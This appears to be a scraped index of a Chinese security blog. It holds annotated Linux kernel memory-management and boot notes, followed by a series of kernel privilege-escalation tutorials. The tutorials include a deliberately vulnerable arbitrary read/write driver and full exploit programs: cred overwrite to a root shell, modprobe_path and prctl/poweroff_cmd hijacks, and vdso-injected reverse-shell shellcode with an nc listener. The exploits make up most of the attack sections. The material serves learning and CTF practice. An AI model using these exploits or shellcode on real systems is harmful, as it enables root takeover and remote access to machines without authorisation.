(unlikely(cpu_feature_enabled(X86_FEATURE_SMAP) \u0026\u0026 !(hw_error_code \u0026 X86_PF_USER) \u0026\u0026 !(regs-\u003eflags \u0026 X86_EFLAGS_AC))) { bad_area_nosemaphore(regs, hw_error_code, address); return; } /* * If we're in an interrupt, have no user context or are running * in a region with pagefaults disabled then we must not take the fault */ if (unlikely(faulthandler_disabled() || !mm)) { bad_area_nosemaphore(regs, hw_error_code, address); return; } // 因为到达这一步时cr2中的虚拟地址已经被另存且vmalloc_fault被处理所以开启中断是安全可行的 if (user_mode(regs)) { local_irq_enable(); flags |= FAULT_FLAG_USER; } else { if (regs-\u003eflags \u0026 X86_EFLAGS_IF) local_irq_enable(); } // 记录事件 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, 1, regs, address); // 更新flags标志位(后面引用) if (hw_error_code \u0026 X86_PF_WRITE) flags |= FAULT_FLAG_WRITE; if (hw_error_code \u0026 X86_PF_INSTR) flags |= FAULT_FLAG_INSTRUCTION; #ifdef CONFIG_X86_64 // vsyscall没有vma, 所以在find_vma之前对vsyscall做模拟 if (is_vsyscall_vaddr(address)) { if (emulate_vsyscall(hw_error_code, regs, address)) return; } #endif // 1. 内核只能访问用户地址空间的在exception_tables上定义的指令, 如果直接进行这样的尝试(但指令却在exception_tables之外)则会因为持有了mmap_sem锁, 而让系统死锁 // 2. 所以, 只有当获得mmap_sem锁失败后, 才能尝试使用1. if (unlikely(!down_read_trylock(\u0026mm-\u003emmap_sem))) { if (!user_mode(regs) \u0026\u0026 !search_exception_tables(regs-\u003eip)) { bad_area_nosemaphore(regs, hw_error_code, address); return; } retry: down_read(\u0026mm-\u003emmap_sem); } else { // 如果获得mmap_sem锁成功则会错过down_read内的might_sleep, 这里补一个might_sleep might_sleep(); } // 判断vma是否合法 vma = find_vma(mm, address); if (unlikely(!vma)) { bad_area(regs, hw_error_code, address); return; } // 做简单的安全检测 if (likely(vma-\u003evm_start \u003c= address)) goto good_area; // 判断vma是否向下增加 if (unlikely(!(vma-\u003evm_flags \u0026 VM_GROWSDOWN))) { bad_area(regs, hw_error_code, address); return; } // 如果address在栈空间, 则根据address和vma-\u003estart的关系决定是否扩充栈 // 如果address \u003c vma-\u003estart, 则另vma-\u003estart=address向下扩充stack if (unlikely(expand_stack(vma, address))) { bad_area(regs, hw_error_code, address); return; } good_area: // 判断是否因为页操作与vma权限不符(保留X86_PF_PK错误, 因为这是留给写时复制的, 并非权限错误) if (unlikely(access_error(hw_error_code, vma))) { bad_area_access_error(regs, hw_error_code, address, vma); return; } // 缺页处理 fault = handle_mm_fault(vma, address, flags); ... 9.4.1. handle_mm_fault static vm_fault_t __handle_mm_fault(struct vm_area_struct *vma, unsigned long address, unsigned int flags) { struct vm_fault vmf = { .vma = vma, .address = address \u0026 PAGE_MASK, .flags = flags, .pgoff = linear_page_index(vma, address), .gfp_mask = __get_fault_gfp_mask(vma), }; unsigned int dirty = flags \u0026 FAULT_FLAG_WRITE; // 以vma-\u003evm_mm为根结点遍历页表, 定位到pmd struct mm_struct *mm = vma-\u003evm_mm; pgd_t *pgd; p4d_t *p4d; vm_fault_t ret; // 定位pgd pgd = pgd_offset(mm, address); // 如果没开5级页表直接返回pgd p4d = p4d_alloc(mm, pgd, address); if (!p4d) return VM_FAULT_OOM; // 定位pud vmf.pud = pud_alloc(mm, p4d, address); if (!vmf.pud) return VM_FAULT_OOM; // 中间表项为空, 且开启huge_page, 设置 // 如果pud为空, 且vma可以创建透明的huge_page, 则create_huge_pud触发huge_page错误(匿名页不支持) if (pud_none(*vmf.pud) \u0026\u0026 __transparent_hugepage_enabled(vma)) { ret = create_huge_pud(\u0026vmf); if (!(ret \u0026 VM_FAULT_FALLBACK)) return ret; } else { pud_t orig_pud = *vmf.pud; barrier(); // pud具有_PAGE_PSE标志位, 且pud为devmap if (pud_trans_huge(orig_pud) || pud_devmap(orig_pud)) { // pud将要被更新为脏页 if (dirty \u0026\u0026 !pud_write(orig_pud)) { // 触发huge_page错误(匿名页不支持) ret = wp_huge_pud(\u0026vmf, orig_pud); if (!(ret \u0026 VM_FAULT_FALLBA","date":"2021-01-12","objectID":"/kernel_mm/:9:4","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"10. ptmalloc ptmalloc是linux 用户态堆管理机制, 也是本文源码分析的最后一部分, 链接如下: ptmalloc源码解析 ","date":"2021-01-12","objectID":"/kernel_mm/:10:0","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"11. 杂记 山高路远不畏险 还有很多需要写的东西, 留给下一篇文章 ","date":"2021-01-12","objectID":"/kernel_mm/:11:0","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":null,"content":"友链 逆向师傅 wuuuudle minhal Pwn师傅 ScUpax0s Web师傅 Unc1e 密码学师傅 vagrant ","date":"2021-01-07","objectID":"/links/:0:0","tags":null,"title":"Links","uri":"/links/"},{"categories":["linux内核源码分析"],"content":"发表于看雪论坛 本文详细讲解linux内核的加载过程，参考linux-insiders，并结合linux-5.6.6代码对原文的部分老旧内容做修改 引导 按下电源开关后, CPU设置寄存器为预定值，程序在实模式下运行，程序首先执行0xfffffff0(映射至ROM)处内容，此处为复位向量，直接跳转至BIOS。 BIOS初始化，检查硬件，寻找可引导设备，跳转至引导扇区代码(boot.img) 寻找可引导设备方式: 定位MBR分区, 引导扇区存储在第一个扇区(512字节)的头446字节处。引导扇区以0x55和0xaa(magic bytes)结束。 MBR分区代码只占用一个扇区, 空间较小，只执行了一些初始化工作, 然后跳转至GRUB2的core image(以diskboot.img为起始)继续执行。 core image的初始化代码将剩余的core image(包含GRUB 2的内核代码和文件系统驱动)加载到内存中，运行grub_main grub_main 初始化控制台，计算模块基地址，设置root设备，读取 grub 配置文件，加载模块等，最后将grub切换为normal模式 normal模式调用grub_normal_execute完成最后的准备工作，显示一个菜单列出可用的操作系统。 选择操作系统后grub_menu_execute_entry被调用，用以运行boot命令，引导操作系统, 运行kernel代码 内核自带bootloader，但是新版本内核已经弃用 kernel boot protocol规定，bootloader必须具备协议中规定的头信息 实模式运行内核 kernel地址(header.S _start)位于X + sizeof(KernelBootSector) + 1 内核加载进入内存后，空间排布 | Protected-mode kernel | 100000 +------------------------+ | I/O memory hole | 0A0000 +------------------------+ | Reserved for BIOS | Leave as much as possible unused ~ ~ | Command line | (Can also be below the X+10000 mark) X+10000 +------------------------+ | Stack/heap | For use by the kernel real-mode code. X+08000 +------------------------+ | Kernel setup | The kernel real-mode code. | Kernel boot sector | The kernel legacy boot sector. X +------------------------+ | Boot loader | \u003c- Boot sector entry point 0x7C00 001000 +------------------------+ | Reserved for MBR/BIOS | 000800 +------------------------+ | Typically used by MBR | 000600 +------------------------+ | BIOS use only | 000000 +------------------------+ kernel初始代码功能: 设置段寄存器，堆栈，BSS段，跳转进入main main函数(主要用来填充boot_params参数) main函数解析 copy_boot_params(); /* 1. 将header.S中定义的hdr拷贝到boot_params结构体的 struct setup_header hdr中。 2. 如果内核是通过老的命令行协议运行起来的，那么就更新 内核的命令行指针(boot_params.hdr.cmd_line_ptr)。 */ /* Initialize the early-boot console */ console_init(); /* 根据命令行参数设置串口,例如ttyS0 */ if (cmdline_find_option_bool(\"debug\")) puts(\"early console in setup code\\n\"); /* End of heap check */ init_heap(); /* 1. stack_end = esp - STACK_SIZE 2. 如果heap_end大于stack_end，令stack_end=heap_end */ /* Make sure we have all the proper CPU support */ /* 查看当前CPU level，如果低于系统预设的最低CPU level, 则系统停止运行 */ if (validate_cpu()) { puts(\"Unable to boot - please use a kernel appropriate \" \"for your CPU.\\n\"); die(); } /* Tell the BIOS what CPU mode we intend to run in. */ set_bios_mode(); /* Detect memory layout */ /* 循环执行调用号为0xe820的0x15中断调用，将每次的返回值 保存在e820entry数组中,每项的成员如下 * 内存段的起始地址 * 内存段的大小 * 内存段的类型（类型可以是reserved, usable等等)。 */ detect_memory(); /* Set keyboard repeat rate (why?) and query the lock flags */ /* 1. 通过中断获得键盘状态 2. 设置键盘的按键检测频率 */ keyboard_init(); /* Query Intel SpeedStep (IST) information */ query_ist(); /* Query APM information */ #if defined(CONFIG_APM) || defined(CONFIG_APM_MODULE) query_apm_bios(); #endif /* Query EDD information */ #if defined(CONFIG_EDD) || defined(CONFIG_EDD_MODULE) query_edd(); #endif /* Set the video mode */ /* 设置屏幕,暂时用不到=。= */ set_video(); /* Do the last things and invoke protected mode */ go_to_protected_mode(); 内核切换至保护模式 mian调用go_to_protected_mode()函数，由实模式切换至保护模式 realmode_switch_hook: 如果boot_params.hdr.realmode_swtch 存在，则跳转执行boot_params.hdr.realmode_swtch(禁用NMI中断), 否则直接禁用NMI中断(写数据需要时间，所以后面紧跟io_delay实现短暂延迟) enable_a20： 检测a20是否被激活，如果没有则尝试多种方法激活a20， 激活失败，则系统停止运行 set_idt(null_idt为空，使用lidt将null_idt加载入idt寄存器) static void setup_idt(void) { static const struct gdt_ptr null_idt = {0, 0}; asm volatile(\"lidtl %0\" : : \"m\" (null_idt)); } set_gdt 使用boot_gdt[]数组存储gdt全局表，初始化CS，DS，TSS表项 /* CS: code, read/execute, 4 GB, base 0 */ [GDT_ENTRY_BOOT_CS] = GDT_ENTRY(0xc09b, 0, 0xfffff), /* DS: data, read/write, 4 GB, base 0 */ [GDT_ENTRY_BOOT_DS] = GDT_ENTRY(0xc093, 0, 0xfffff), /* TSS: 32-bit tss, 104 bytes, base 4096 */ /* We only have a TSS here to keep Intel VT happy; we don't actually use it for anything. */ [GDT_ENTRY_BOOT_TSS] = GDT_ENTRY(0x0089, 4096, 103), 使用static struct gdt_ptr gdt存储gdt全局表大小与地址 使用lgdt将gdt_ptr加载如gdt寄存器 protected_mode_jump(boot_params.hdr.code32_start,(u32\u0026boot_params + (ds() « 4)); 该函数使用gcc noreturn特性描述 传递co","date":"2020-06-06","objectID":"/kernel_boot/:0:0","tags":["linux kernel","源码分析","boot"],"title":"linux内核(5.4.81)---内核引导","uri":"/kernel_boot/"},{"categories":["linux内核态漏洞利用"],"content":"发表于看雪论坛 ","date":"2020-02-02","objectID":"/kernel_rw4/:0:0","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(四)","uri":"/kernel_rw4/"},{"categories":["linux内核态漏洞利用"],"content":"hijack_modprobe_path篇 原理同hijack_prctl, 当用户执行错误格式的elf文件时内核调用call_usermodehelper(char *modprobe_path …) 修改modprobe后，即可实现root权限任意命令执行 攻击流程 (内核任意读写漏洞)内核修改全局变量 modprobe_path为目标指令 写入错误格式elf文件，并手动执行，触发 ","date":"2020-02-02","objectID":"/kernel_rw4/:1:0","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(四)","uri":"/kernel_rw4/"},{"categories":["linux内核态漏洞利用"],"content":"一. 利用步骤 1. 定位modprobe_path(开启kaslr) 同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址 获得当前调试阶段modprobe_path与内核基地址固定偏移 modprobe_path_addr = 内核基地址+固定偏移 2. 修改modprobe_path 为任意指令 ","date":"2020-02-02","objectID":"/kernel_rw4/:1:1","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(四)","uri":"/kernel_rw4/"},{"categories":["linux内核态漏洞利用"],"content":"二. 驱动代码(见cred) ","date":"2020-02-02","objectID":"/kernel_rw4/:1:2","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(四)","uri":"/kernel_rw4/"},{"categories":["linux内核态漏洞利用"],"content":"三. exp #define _GNU_SOURCE #include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cfcntl.h\u003e#include \u003cunistd.h\u003e#include \u003cstdlib.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/auxv.h\u003e#include \u003csys/prctl.h\u003e #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 size_t modprobe_path = 0xe3cba0; size_t vmlinux_base = 0; struct vunl { char *point; size_t size; } VUNL; void leak_data(int fd, char *buf) { char *res = NULL; VUNL.size = 0x1000; for (size_t addr = 0xffffffff80000000; addr \u003c 0xffffffffffffffff; addr += 0x1000) { VUNL.point = (char *)addr; ioctl(fd, CHANGE_POINT, \u0026VUNL); //change the point ioctl(fd, RW_READ, buf); if (!strcmp(\"gettimeofday\", buf + 0x2b5)) { printf(\"[+] the addr of VDSO is: 0x%lx\\n\", addr); vmlinux_base = addr \u0026 0xffffffffff000000; printf(\"[+] the addr of vmlinux base is: 0x%lx\\n\", vmlinux_base); break; } puts(\"[-] not found, try again!\\n\"); } return; } int main(int argc, char *argv[]) { int fd = 0; char *buf = malloc(0x1000); fd = open(\"/dev/rw_any_dev\", O_RDWR); leak_data(fd, buf); modprobe_path += vmlinux_base; printf(\"[+] the addr of modprobe_path is: 0x%lx\\n\", modprobe_path); VUNL.size = strlen(argv[1])+1; VUNL.point = (char *)modprobe_path; ioctl(fd, CHANGE_POINT, \u0026VUNL); ioctl(fd, RW_WRITE, argv[1]); system(\"echo -ne '#!/bin/sh\\nchmod 777 /flag' \u003e /su.sh\"); system(\"chmod +x /su.sh\"); system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' \u003e /dummy\"); system(\"chmod +x /dummy\"); system(\"/dummy\"); return 0; } ","date":"2020-02-02","objectID":"/kernel_rw4/:1:3","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(四)","uri":"/kernel_rw4/"},{"categories":["linux内核态漏洞利用"],"content":"发表于看雪论坛 ","date":"2020-01-30","objectID":"/kernel_rw3/:0:0","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(三) ","uri":"/kernel_rw3/"},{"categories":["linux内核态漏洞利用"],"content":"hijack_prctl篇 prctl函数: 用户态函数，可用于定制进程参数，非常适合和内核进行交互 用户态执行prctl函数后触发prctl系统调用 内核接收参数后执行security_task_prctl security_task_prctl执行hook.task_prctl poweroff_work_func函数: 内核函数，执行 run_cmd(poweroff_cmd)，即root权限执行poweroff_cmd 攻击流程: 劫持hook.task_prctl为目标函数地址(poweroff_work_func) 修改poweroff_cmd为目标指令 用户执行prctl函数，触发 ","date":"2020-01-30","objectID":"/kernel_rw3/:1:0","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(三) ","uri":"/kernel_rw3/"},{"categories":["linux内核态漏洞利用"],"content":"一. 利用步骤 1. 定位内核加载基地址(开启kaslr) 同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址 2. 定位hook.prctl，poweroff_cmd地址 gdb调试内核并在security_task_prctl函数处下断点，用户态程序执行prctl函数，进入security_task_prctl函数，单步执行汇编指令，通过内存查看hook.task_prctl 地址 gdb 执行 p poweroff_cmd，获得poweroff_cmd真实地址 获得hook.prctl，poweroff_cmd与内核基地址固定偏移 3. 修改poweroff_cmd 为任意指令 4. 用户态执行prctl函数，触发 ","date":"2020-01-30","objectID":"/kernel_rw3/:1:1","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(三) ","uri":"/kernel_rw3/"},{"categories":["linux内核态漏洞利用"],"content":"二. 驱动代码(见cred篇) ","date":"2020-01-30","objectID":"/kernel_rw3/:1:2","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(三) ","uri":"/kernel_rw3/"},{"categories":["linux内核态漏洞利用"],"content":"三. exp #define _GNU_SOURCE #include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cfcntl.h\u003e#include \u003cunistd.h\u003e#include \u003cstdlib.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/auxv.h\u003e#include \u003csys/prctl.h\u003e #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 #define SET_MEM 0X100003 size_t poweroff_cmd = 0; size_t prctl_hook = 0; size_t poweroff_work_func = 0; size_t vmlinux_base = 0; struct vunl { char *point; size_t size; } VUNL; void leak_data(int fd, char *buf) { char *res = NULL; VUNL.size = 0x1000; for (size_t addr = 0xffffffff80000000; addr \u003c 0xffffffffffffffff; addr += 0x1000) { VUNL.point = (char *)addr; ioctl(fd, CHANGE_POINT, \u0026VUNL); //change the point ioctl(fd, RW_READ, buf); if (!strcmp(\"gettimeofday\", buf + 0x2b5)) { printf(\"[+] the addr of VDSO is: 0x%lx\\n\", addr); vmlinux_base = addr \u0026 0xffffffffff000000; printf(\"[+] the addr of vmlinux base is: 0x%lx\\n\", vmlinux_base); break; } puts(\"[-] not found, try again!\\n\"); } return; } int main(int argc, char *argv[]) { int fd = 0; char *buf = malloc(0x1000); char cmd[] = \"/bin/chmod 777 /flag\\x00\"; fd = open(\"/dev/rw_any_dev\", O_RDWR); leak_data(fd, buf); poweroff_cmd = vmlinux_base + 0xe3e1a0; prctl_hook = vmlinux_base + 0xe81078; poweroff_work_func = vmlinux_base + 0x075480; printf(\"[+] the addr of poweroff_cmd is: 0x%lx\\n\", poweroff_cmd); printf(\"[+] the addr of prctl hook is: 0x%lx\\n\", prctl_hook); printf(\"[+] the addr of orderly_poweroff is: 0x%lx\\n\", poweroff_work_func); VUNL.size = strlen(cmd)+1; // VUNL.size = strlen(argv[1])+1; VUNL.point = (char *)poweroff_cmd; ioctl(fd, CHANGE_POINT, \u0026VUNL); ioctl(fd, RW_WRITE, cmd); // ioctl(fd, RW_WRITE, argv[1]); VUNL.size = 8; VUNL.point = (char *)prctl_hook; ioctl(fd, CHANGE_POINT, \u0026VUNL); ioctl(fd, RW_WRITE, \u0026poweroff_work_func); puts(\"[+] the cmd arg must have an ansolute_address\"); prctl(PR_GET_NAME, \"test\"); return 0; } ","date":"2020-01-30","objectID":"/kernel_rw3/:1:3","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(三) ","uri":"/kernel_rw3/"},{"categories":["linux内核态漏洞利用"],"content":"发表于看雪论坛 ","date":"2020-01-21","objectID":"/kernel_rw2/:0:0","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(二)","uri":"/kernel_rw2/"},{"categories":["linux内核态漏洞利用"],"content":"hijack_vdso篇 vdso: 内核实现的一个动态库，存在于内核，然后映射到用户态空间，可由用户态直接调用 内核中的vdso如果被修改，那么用户态空间的vdso也会同步被修改 攻击流程 (内核任意代码执行漏洞)内核调用set_memory_rw 函数修改内核vdso页面属性，使得用户态可以直接修改vdso，劫持vdso为shellcode，触发条件同1 (内核任意读写漏洞)内核修改内核vdso数据，写入shellcode，使得用户态vdso中函数被劫持，当高权限进程调用vdso中特定函数时，触发shellcode，本篇只讲解攻击流程2 ","date":"2020-01-21","objectID":"/kernel_rw2/:1:0","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(二)","uri":"/kernel_rw2/"},{"categories":["linux内核态漏洞利用"],"content":"一. 利用步骤 1. 定位内核态vdso位置 vdso中存在一些比较有特点的字符串，比如\"gettimeofday\"，在拥有任意读漏洞的前提下，从0xffffffff80000000(开启kaslr后内核基地址在此地址基础上往上偏移)开始按页搜索内存 如果内存其他地方存在\"gettimeofday\"字符串，且出现在vdso之前，则会返回错误地址。所以在内存搜索时，应以返回地址为起始，使用gdb dump 0x2000 内存，使用ida查看是否是vdso，如果不是，可以忽略这个错误地址，继续向下搜索。 得到真正的vdso后，查看\"gettimeofday\"与vdso起始地址的偏移，后续匹配vdso时，加上这个偏移条件 2. 向内核中vdso写入shellcode shellcode功能: 判断进程是否具有root权限，如果成立，则开辟新进程用来反弹root shell shellcode写入位置: 定位vdso上某函数，比如gettimeofday函数，使用shellcode覆盖 shellcode触发条件: 当高权限进程调用gettimeofday函数时，自动执行shellcode 反弹root shell ","date":"2020-01-21","objectID":"/kernel_rw2/:1:1","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(二)","uri":"/kernel_rw2/"},{"categories":["linux内核态漏洞利用"],"content":"二. 驱动代码(见cred篇) ","date":"2020-01-21","objectID":"/kernel_rw2/:1:2","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(二)","uri":"/kernel_rw2/"},{"categories":["linux内核态漏洞利用"],"content":"三. exp #define _GNU_SOURCE #include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cfcntl.h\u003e#include \u003cunistd.h\u003e#include \u003cstdlib.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/auxv.h\u003e #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 #define SET_MEM 0X100003 struct vunl { char *point; size_t size; } VUNL; char shellcode[] = \"\\x90\\x53\\x48\\x31\\xC0\\xB0\\x66\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xC3\\x75\" \"\\x0F\\x48\\x31\\xC0\\xB0\\x39\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xD8\\x74\\x09\" \"\\x5B\\x48\\x31\\xC0\\xB0\\x60\\x0F\\x05\\xC3\\x48\\x31\\xD2\\x6A\\x01\\x5E\\x6A\" \"\\x02\\x5F\\x6A\\x29\\x58\\x0F\\x05\\x48\\x97\\x50\\x48\\xB9\\xFD\\xFF\\xF2\\xFA\" \"\\x80\\xFF\\xFF\\xFE\\x48\\xF7\\xD1\\x51\\x48\\x89\\xE6\\x6A\\x10\\x5A\\x6A\\x2A\" \"\\x58\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xD8\\x74\\x07\\x48\\x31\\xC0\\xB0\\xE7\" \"\\x0F\\x05\\x90\\x6A\\x03\\x5E\\x6A\\x21\\x58\\x48\\xFF\\xCE\\x0F\\x05\\x75\\xF6\" \"\\x48\\x31\\xC0\\x50\\x48\\xBB\\xD0\\x9D\\x96\\x91\\xD0\\x8C\\x97\\xFF\\x48\\xF7\" \"\\xD3\\x53\\x48\\x89\\xE7\\x50\\x57\\x48\\x89\\xE6\\x48\\x31\\xD2\\xB0\\x3B\\x0F\" \"\\x05\\x48\\x31\\xC0\\xB0\\xE7\\x0F\\x05\"; char *leak_data(int fd, char *buf) { char *res = NULL; VUNL.size = 0x1000; for (size_t addr = 0xffffffff80000000; addr \u003c 0xffffffffffffffff; addr += 0x1000) { VUNL.point = (char *)addr; ioctl(fd, CHANGE_POINT, \u0026VUNL); //change the point ioctl(fd, RW_READ, buf); printf(\"addr is: %p, context is: 0x%lx\\n\", VUNL.point, *(size_t *)buf); if (!strcmp(\"gettimeofday\", buf + 0x2b5)) { res = (char *)addr; break; } puts(\"[-] not found, try again!\\n\"); } return res; } int check_vdso_shellcode() { size_t addr = 0; addr = getauxval(AT_SYSINFO_EHDR); if (addr \u003c 0) { puts(\"[-] can not get VDSO addr\\n\"); return 0; } printf(\"[+] usr::VDSO addr is: 0x%lx\\n\", addr); if (memmem((char *)addr, 0x1000, shellcode, strlen(shellcode))) { return 1; } return 0; } int main() { int fd = 0; char *buf = malloc(0x1000); fd = open(\"/dev/rw_any_dev\", O_RDWR); VUNL.point = (char *)leak_data(fd, buf); VUNL.size = strlen(shellcode); VUNL.point = VUNL.point + 0xb00; ioctl(fd, CHANGE_POINT, \u0026VUNL); ioctl(fd, RW_WRITE, shellcode); printf(\"[+] hook in %p\\n\", VUNL.point); if (check_vdso_shellcode()) { puts(\"[+] the shellcode has hook in VDSO\"); system(\"nc -lp 3333\"); } else { puts(\"[-] error!\"); } return 0; } ","date":"2020-01-21","objectID":"/kernel_rw2/:1:3","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(二)","uri":"/kernel_rw2/"},{"categories":["linux内核态漏洞利用"],"content":"发表于看雪论坛 ","date":"2020-01-11","objectID":"/kernel_rw1/:0:0","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(一)","uri":"/kernel_rw1/"},{"categories":["linux内核态漏洞利用"],"content":"cred篇 每个线程在内核中都对应一个线程结构块thread_info thread_info中存在task_struct类型结构体 struct task_struct中存在cred结构体用来保存线程权限 攻击流程 定位某进程的cred结构体 将cred结构提结构体的uid~fsgid全部覆写为0(前28字节) ","date":"2020-01-11","objectID":"/kernel_rw1/:1:0","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(一)","uri":"/kernel_rw1/"},{"categories":["linux内核态漏洞利用"],"content":"一. 利用步骤 1. 定位cred结构体 task_struct中存在char comm[TASK_COMM_LEN] comm字符串使用prctl函数的PR_SET_NAME自行设置 在内存中搜索被设置后的comm字符串，cred结构体地址就在附近 泄漏cred结构体地址，定向覆盖cred结构体 2. 进程权限被修改，变成root进程，执行system(\"/bin/sh\")，弹出root shell ","date":"2020-01-11","objectID":"/kernel_rw1/:1:1","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(一)","uri":"/kernel_rw1/"},{"categories":["linux内核态漏洞利用"],"content":"二. 驱动代码 #include \u003clinux/init.h\u003e#include \u003clinux/module.h\u003e#include \u003clinux/cdev.h\u003e#include \u003clinux/device.h\u003e#include \u003clinux/fs.h\u003e#include \u003clinux/uaccess.h\u003e#include \u003casm/cacheflush.h\u003e #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 #define SET_MEM 0x100003 dev_t dev_id = 0; struct cdev cdev_0; struct class *dev_class; struct vunl { char *point; size_t size; } VUNL; long rw_any_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) { int ret = 0; switch (cmd) { case CHANGE_POINT: ret = copy_from_user(\u0026VUNL, (struct vunl *)(arg), sizeof(struct vunl)); break; case RW_READ: ret = copy_to_user((char *)arg, (char *)VUNL.point, VUNL.size); break; case RW_WRITE: ret = copy_from_user((char *)VUNL.point, (char *)arg, VUNL.size); break; default: break; } return ret; } int rw_any_init(void) { unsigned int base_minor = 0; unsigned int dev_num = 1; static const struct file_operations fops = { .unlocked_ioctl = rw_any_ioctl}; alloc_chrdev_region(\u0026dev_id, base_minor, dev_num, \"rw_any\"); cdev_init(\u0026cdev_0, \u0026fops); cdev_add(\u0026cdev_0, dev_id, 1); dev_class = class_create(THIS_MODULE, \"rw_any_class\"); device_create(dev_class, 0, dev_id, NULL, \"rw_any_dev\"); return 0; } void rw_any_exit(void) { device_destroy(dev_class, dev_id); class_destroy(dev_class); cdev_del(\u0026cdev_0); unregister_chrdev_region(dev_id, 1); } module_init(rw_any_init); module_exit(rw_any_exit); MODULE_LICENSE(\"GPL\"); ","date":"2020-01-11","objectID":"/kernel_rw1/:1:2","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(一)","uri":"/kernel_rw1/"},{"categories":["linux内核态漏洞利用"],"content":"三. exp #define _GNU_SOURCE #include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cfcntl.h\u003e#include \u003cunistd.h\u003e#include \u003cstdlib.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/prctl.h\u003e #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 struct vunl { char *point; size_t size; } VUNL; size_t leak_data(int fd, char *buf, char *target) { char *res = 0; size_t cred = 0; size_t real_cred = 0; VUNL.size = 0x1000; for (size_t addr = 0xffff880000000000; addr \u003c 0xffffc80000000000; addr += 0x1000) { VUNL.point = (char *)addr; ioctl(fd, CHANGE_POINT, \u0026VUNL); ioctl(fd, RW_READ, buf); res = memmem(buf, 0x1000, target, 16); if (res) { printf(\"[+] the addr of comm[TASK_COMM_LEN] is: %p\\n\", res); cred = *(size_t *)(res - 0x8); real_cred = *(size_t *)(res - 0x10); if ((cred || 0xff00000000000000) \u0026\u0026 (real_cred == cred)) { printf(\"[+] found cred 0x%lx\\n\", real_cred); break; } } if (res == 0) { puts(\"[-] not found, try again!\\n\"); } } return real_cred; } int main() { int fd = 0; char target[16] = \"TheTargetOfComm\"; char *buf = malloc(0x1000); char payload[28] = {0}; size_t cred = 0; prctl(PR_SET_NAME, target); fd = open(\"/dev/rw_any_dev\", O_RDWR); VUNL.point = (char *)leak_data(fd, buf, target); VUNL.size = 28; ioctl(fd, CHANGE_POINT, \u0026VUNL); ioctl(fd, RW_WRITE, payload); if (getuid() == 0) { printf(\"[+] r00t:\\n\"); system(\"/bin/sh\"); } else { puts(\"[-] error!\"); exit(-1); } return 0; } ","date":"2020-01-11","objectID":"/kernel_rw1/:1:3","tags":["linux kernel","rw","exp"],"title":"linux 内核提权总结(demo+exp分析) -- 任意读写(一)","uri":"/kernel_rw1/"},{"categories":["linux内核态漏洞利用"],"content":"发表于看雪论坛 ","date":"2020-01-06","objectID":"/kernel_rop2/:0:0","tags":["linux kernel","rop","exp"],"title":"linux 内核提权总结(demo+exp分析) -- ROP(二)","uri":"/kernel_rop2/"},{"categories":["linux内核态漏洞利用"],"content":"ret2usr CR4篇 smep: smep是内核的一种保护措施, 使得内核不可执行用户态代码 内核通过CR4寄存器的第20位来控制smep, 第20位为0时，smep被关闭 攻击流程 提前在用户态代码中构造进程提权代码(get_root) ROP技术修改CR4第20位数据为0(关闭smep), 通常使用 mov cr4, 0x6f0 修改 rip 